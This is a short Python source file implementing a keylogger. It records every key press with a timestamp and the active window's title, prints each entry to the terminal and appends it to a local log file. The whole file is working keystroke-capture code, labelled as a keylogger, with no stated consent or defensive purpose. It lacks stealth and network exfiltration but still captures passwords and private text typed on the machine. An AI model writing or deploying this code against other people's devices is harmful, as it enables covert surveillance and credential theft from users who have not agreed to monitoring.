from pynput.keyboard import Listener
from datetime import datetime
import pygetwindow as gw
import os

os.makedirs("logs", exist_ok=True)

log_file = "logs/activity_log.txt"


def get_active_window():
    try:
        window = gw.getActiveWindow()
        if window:
            return window.title
        return "Unknown Window"
    except:
        return "Unknown Window"


def log_key(key):

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_data = key.char
    except:
        key_data = str(key)

    window = get_active_window()

    log_entry = f"{timestamp} [{window}] - {key_data}"

    # SHOW IN TERMINAL
    print(log_entry)

    # SAVE TO FILE
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(log_entry + "\n")


def start_keylogger():

    print("[INFO] Keylogger started")

    with Listener(on_press=log_key) as listener:
        listener.join()